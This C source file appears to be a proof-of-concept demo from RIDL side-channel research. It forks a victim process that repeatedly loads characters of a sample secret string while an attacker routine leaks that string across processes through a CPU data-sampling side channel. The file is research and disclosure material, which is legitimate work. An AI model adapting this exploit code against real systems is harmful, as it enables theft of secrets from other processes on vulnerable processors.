#include "../primitives/basic_primitives.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include "utils.h"


#define REPS 200000
#define WRITE_VALUE 42ull
#define CYCLE_LENGTH 400000000


inline void *victim(char *secret, int cycle_length) {
    set_processor_affinity(writer_cpu);

    int length = strlen(secret);
    struct timespec spec;
    clock_gettime(CLOCK_REALTIME, &spec);
    uint64_t t;
    usleep(cycle_length / 1000);
    uint64_t *destination = aligned_alloc(_page_size, _page_size);

    for (int i = 0; i < length; i++) {
        t = time_convert(&spec);
        destination[0] = (uint64_t) secret[i];
        while (time_convert(&spec) - t < cycle_length) {
            int j = 1000;
            while (j--) load_and_flush(destination);
            clock_gettime(CLOCK_REALTIME, &spec);
        }
    }
    destination[0] = 7;
    while (1) { load_and_flush(destination); }
}

int main(int argc, char** args) {
    printf("Demo 2b: Observing a string (load)\n");
    get_same_core_cpus(&reader_cpu, &writer_cpu);
    _page_size = getpagesize();
    time_t tm;
    time(&tm);
    srand(tm);
    char *secret = sample_strings[random() % sample_string_count];
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    ridl_init(argc, args);
    pid = fork();
    if (!pid) {
        victim(secret, CYCLE_LENGTH);
        return 0;
    }
    string_attacker(mem, CYCLE_LENGTH);
    kill(pid, SIGKILL);
    usleep(10000);

    ridl_cleanup();
    printf("Done.\n");
    return 0;
}

